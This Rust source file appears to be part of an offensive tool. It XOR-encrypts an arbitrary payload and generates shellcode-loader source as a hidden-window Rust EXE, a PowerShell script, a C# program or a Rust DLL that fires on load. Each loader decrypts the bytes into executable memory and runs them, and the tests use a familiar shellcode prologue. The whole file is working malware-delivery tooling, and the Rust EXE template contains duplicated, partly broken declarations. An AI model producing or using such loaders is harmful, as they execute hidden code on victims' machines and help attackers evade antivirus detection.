#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PackageFormat {
    Exe,
    Ps1,
    CSharp,
    Dll,
}

impl PackageFormat {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "exe" | "rust_exe" | "rustexe" => Some(Self::Exe),
            "ps1" | "powershell" | "psh" => Some(Self::Ps1),
            "csharp" | "cs" | "c#" => Some(Self::CSharp),
            "dll" | "rust_dll" | "rustdll" => Some(Self::Dll),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::Exe => "Rust EXE",
            Self::Ps1 => "PowerShell",
            Self::CSharp => "C# Source",
            Self::Dll => "Rust DLL",
        }
    }

    pub fn extension(&self) -> &'static str {
        match self {
            Self::Exe => "rs",
            Self::Ps1 => "ps1",
            Self::CSharp => "cs",
            Self::Dll => "rs",
        }
    }

    pub fn all() -> &'static [Self] {
        &[Self::Exe, Self::Ps1, Self::CSharp, Self::Dll]
    }
}

pub fn package(payload: &[u8], format: PackageFormat) -> Result<String, String> {
    if payload.is_empty() {
        return Err("payload is empty".to_string());
    }

    let key: u8 = 0x5A;
    let encrypted: Vec<u8> = payload.iter().map(|b| b ^ key).collect();

    match format {
        PackageFormat::Exe => Ok(emit_rust_exe(&encrypted, key)),
        PackageFormat::Ps1 => Ok(emit_ps1(&encrypted, key)),
        PackageFormat::CSharp => Ok(emit_csharp(&encrypted, key)),
        PackageFormat::Dll => Ok(emit_rust_dll(&encrypted, key)),
    }
}

fn format_rust_bytes(data: &[u8]) -> String {
    let mut out = String::new();
    for (i, b) in data.iter().enumerate() {
        if i % 16 == 0 {
            if i > 0 {
                out.push('\n');
            }
            out.push_str("        ");
        }
        out.push_str(&format!("0x{:02X},", b));
        if i % 16 != 15 && i + 1 < data.len() {
            out.push(' ');
        }
    }
    out
}

fn format_csharp_bytes(data: &[u8]) -> String {
    let mut out = String::new();
    for (i, b) in data.iter().enumerate() {
        if i % 16 == 0 {
            if i > 0 {
                out.push('\n');
            }
            out.push_str("            ");
        }
        out.push_str(&format!("0x{:02X},", b));
        if i % 16 != 15 && i + 1 < data.len() {
            out.push(' ');
        }
    }
    out
}

fn emit_rust_exe(encrypted: &[u8], key: u8) -> String {
    let bytes_str = format_rust_bytes(encrypted);
    format!(
        r#"#![windows_subsystem = "windows"]
#![allow(non_snake_case)]

use std::ffi::CString;

type FnGetModuleHandleA = unsafe extern "system" fn(*const u8) -> *mut u8;
type FnGetProcAddress = unsafe extern "system" fn(*mut u8, *const u8) -> *mut u8;
type FnVirtualAlloc = unsafe extern "system" fn(*mut u8, usize, u32, u32) -> *mut u8;

const DATA: [u8; {}] = [
{}
];
const KEY: u8 = 0x{:02X};

fn main() {{
    unsafe {{
        let k32 = CString::new("kernel32.dll").unwrap();
        let gpa = CString::new("GetProcAddress").unwrap();
        let va_name = CString::new("VirtualAlloc").unwrap();

        let get_mod: FnGetModuleHandleA = std::mem::transmute(
            GetModuleHandleA(k32.as_ptr() as *const u8)
        );
        let _ = get_mod; // kernel32 handle
        let h_k32 = GetModuleHandleA(k32.as_ptr() as *const u8);

        let get_proc: FnGetProcAddress = std::mem::transmute(
            GetProcAddressRaw(h_k32, gpa.as_ptr() as *const u8)
        );
        let va: FnVirtualAlloc = std::mem::transmute(
            get_proc(h_k32, va_name.as_ptr() as *const u8)
        );

        let region = va(std::ptr::null_mut(), DATA.len(), 0x3000, 0x40);
        if region.is_null() {{
            return;
        }}

        for i in 0..DATA.len() {{
            *region.add(i) = DATA[i] ^ KEY;
        }}

        let handler: extern "C" fn() = std::mem::transmute(region);
        handler();
    }}
}}

extern "system" {{
    fn GetModuleHandleA(name: *const u8) -> *mut u8;
    fn GetProcAddressRaw(module: *mut u8, name: *const u8) -> *mut u8;
}}

#[link(name = "kernel32")]
extern "system" {{
    #[link_name = "GetProcAddress"]
    fn GetProcAddressRaw(module: *mut u8, name: *const u8) -> *mut u8;
}}
"#,
        encrypted.len(),
        bytes_str,
        key,
    )
}

fn emit_ps1(encrypted: &[u8], key: u8) -> String {
    let b64 = base64_encode(encrypted);
    format!(
        r#"$k = 0x{key:02X}
$enc = [Convert]::FromBase64String("{b64}")
$buf = New-Object byte[] $enc.Length
for ($i = 0; $i -lt $enc.Length; $i++) {{
    $buf[$i] = $enc[$i] -bxor $k
}}

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class W {{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint sz, uint type, uint protect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr tid);
    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 ms);
}}
"@

$region = [W]::VirtualAlloc([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $region, $buf.Length)
$handler = [W]::CreateThread([IntPtr]::Zero, 0, $region, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[W]::WaitForSingleObject($handler, [uint32]"0xFFFFFFFF")
"#,
        key = key,
        b64 = b64,
    )
}

fn emit_csharp(encrypted: &[u8], key: u8) -> String {
    let bytes_str = format_csharp_bytes(encrypted);
    format!(
        r#"using System;
using System.Runtime.InteropServices;

namespace Runner
{{
    class Program
    {{
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr addr, uint sz, uint type, uint protect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr tid);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr handle, uint ms);

        static readonly byte[] data = new byte[] {{
{bytes_str}
        }};

        static void Main()
        {{
            byte[] buf = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {{
                buf[i] = (byte)(data[i] ^ 0x{key:02X});
            }}

            IntPtr region = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            Marshal.Copy(buf, 0, region, buf.Length);
            IntPtr handler = CreateThread(IntPtr.Zero, 0, region, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(handler, 0xFFFFFFFF);
        }}
    }}
}}
"#,
        bytes_str = bytes_str,
        key = key,
    )
}

fn emit_rust_dll(encrypted: &[u8], key: u8) -> String {
    let bytes_str = format_rust_bytes(encrypted);
    format!(
        r#"// Build: cargo build --release --target x86_64-pc-windows-gnu
// Cargo.toml: [lib] crate-type = ["cdylib"]
#![allow(non_snake_case)]

use std::ffi::c_void;

type FnVirtualAlloc = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;

const DATA: [u8; {}] = [
{}
];
const KEY: u8 = 0x{:02X};

#[no_mangle]
pub unsafe extern "system" fn DllMain(_inst: *mut c_void, reason: u32, _: *mut c_void) -> i32 {{
    if reason == 1 {{
        run();
    }}
    1
}}

#[no_mangle]
pub unsafe extern "C" fn Run() {{
    run();
}}

unsafe fn run() {{
    let h = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
    if h.is_null() {{
        return;
    }}
    let va: FnVirtualAlloc = std::mem::transmute(
        GetProcAddress(h, b"VirtualAlloc\0".as_ptr())
    );

    let region = va(std::ptr::null_mut(), DATA.len(), 0x3000, 0x40);
    if region.is_null() {{
        return;
    }}

    let ptr = region as *mut u8;
    for i in 0..DATA.len() {{
        *ptr.add(i) = DATA[i] ^ KEY;
    }}

    let handler: extern "C" fn() = std::mem::transmute(region);
    handler();
}}

extern "system" {{
    fn GetModuleHandleA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
}}
"#,
        encrypted.len(),
        bytes_str,
        key,
    )
}

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::new();
    let mut i = 0;
    while i < data.len() {
        let b0 = data[i] as u32;
        let b1 = if i + 1 < data.len() { data[i + 1] as u32 } else { 0 };
        let b2 = if i + 2 < data.len() { data[i + 2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;

        out.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        out.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);

        if i + 1 < data.len() {
            out.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        if i + 2 < data.len() {
            out.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        i += 3;
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_package_format_from_str() {
        assert_eq!(PackageFormat::from_str("exe"), Some(PackageFormat::Exe));
        assert_eq!(PackageFormat::from_str("ps1"), Some(PackageFormat::Ps1));
        assert_eq!(PackageFormat::from_str("powershell"), Some(PackageFormat::Ps1));
        assert_eq!(PackageFormat::from_str("csharp"), Some(PackageFormat::CSharp));
        assert_eq!(PackageFormat::from_str("cs"), Some(PackageFormat::CSharp));
        assert_eq!(PackageFormat::from_str("dll"), Some(PackageFormat::Dll));
        assert_eq!(PackageFormat::from_str("unknown"), None);
    }

    #[test]
    fn test_package_format_name() {
        assert_eq!(PackageFormat::Exe.name(), "Rust EXE");
        assert_eq!(PackageFormat::Ps1.name(), "PowerShell");
        assert_eq!(PackageFormat::CSharp.name(), "C# Source");
        assert_eq!(PackageFormat::Dll.name(), "Rust DLL");
    }

    #[test]
    fn test_package_format_extension() {
        assert_eq!(PackageFormat::Exe.extension(), "rs");
        assert_eq!(PackageFormat::Ps1.extension(), "ps1");
        assert_eq!(PackageFormat::CSharp.extension(), "cs");
        assert_eq!(PackageFormat::Dll.extension(), "rs");
    }

    #[test]
    fn test_package_all_formats() {
        let payload = vec![0xFC, 0x48, 0x83, 0xE4, 0xF0];
        for fmt in PackageFormat::all() {
            let result = package(&payload, *fmt);
            assert!(result.is_ok(), "failed for {}", fmt.name());
            assert!(!result.unwrap().is_empty());
        }
    }

    #[test]
    fn test_package_empty_payload() {
        let result = package(&[], PackageFormat::Exe);
        assert!(result.is_err());
    }

    #[test]
    fn test_package_exe_contains_key() {
        let result = package(&[0xCC], PackageFormat::Exe).unwrap();
        assert!(result.contains("0x5A"));
    }

    #[test]
    fn test_package_ps1_contains_base64() {
        let result = package(&[0xCC, 0x90, 0xCC], PackageFormat::Ps1).unwrap();
        assert!(result.contains("FromBase64String"));
    }

    #[test]
    fn test_package_csharp_contains_pinvoke() {
        let result = package(&[0xCC], PackageFormat::CSharp).unwrap();
        assert!(result.contains("DllImport"));
        assert!(result.contains("VirtualAlloc"));
    }

    #[test]
    fn test_package_dll_contains_dllmain() {
        let result = package(&[0xCC], PackageFormat::Dll).unwrap();
        assert!(result.contains("DllMain"));
        assert!(result.contains("cdylib"));
    }

    #[test]
    fn test_base64_encode() {
        assert_eq!(base64_encode(b"Man"), "TWFu");
        assert_eq!(base64_encode(b"Ma"), "TWE=");
        assert_eq!(base64_encode(b"M"), "TQ==");
    }
}
